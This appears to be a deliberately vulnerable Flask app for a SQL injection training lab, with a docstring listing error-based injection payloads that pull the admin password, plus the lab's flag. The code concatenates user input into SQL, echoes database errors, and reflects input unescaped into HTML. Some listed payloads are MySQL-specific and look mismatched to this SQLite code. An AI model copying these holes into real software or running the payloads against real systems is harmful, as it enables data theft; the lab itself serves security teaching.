"""
SQL Injection Lab 14: Error-Based SQL Injection
Difficulty: 3 (Advanced)
Points: 100

Description:
SQL injection extracting data through error messages.
"""

from flask import Flask, request
import sqlite3

app = Flask(__name__)

DB_PATH = '/tmp/sqli_14.db'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('''CREATE TABLE IF NOT EXISTS admin 
                      (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')
    cursor.execute("INSERT OR IGNORE INTO admin VALUES (1, 'admin', 'SuperSecret123')")
    conn.commit()
    conn.close()

init_db()

@app.route('/search')
def search():
    """
    VULNERABLE: Error-based SQL injection
    
    Attack Vector:
    /search?q=1' AND extractvalue(1,concat(0x7e,(SELECT password FROM admin LIMIT 1)))--
    /search?q=1' AND updatexml(1,concat(0x7e,(SELECT username FROM admin)),1)--
    /search?q=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM admin),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--
    
    (Simplified for SQLite)
    /search?q=1' AND CAST((SELECT password FROM admin) AS INTEGER)--
    
    Flag: FLAG{sql_injection_error_based_014}
    """
    query = request.args.get('q', '')
    result = None
    
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        # VULNERABLE: Error message reveals data
        sql = f"SELECT * FROM admin WHERE id={query}"
        cursor.execute(sql)
        admin = cursor.fetchone()
        
        result = "Admin found" if admin else "Not found"
        
        conn.close()
    except Exception as e:
        # VULNERABLE: Error message reveals structure
        result = f"Error: {str(e)}"
    
    return f"""
    <html>
    <body>
        <h1>Admin Search</h1>
        <form method="GET">
            <input type="text" name="q" placeholder="Query" value="{query}">
            <button>Search</button>
        </form>
        <p>{result}</p>
    </body>
    </html>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5014, debug=False)
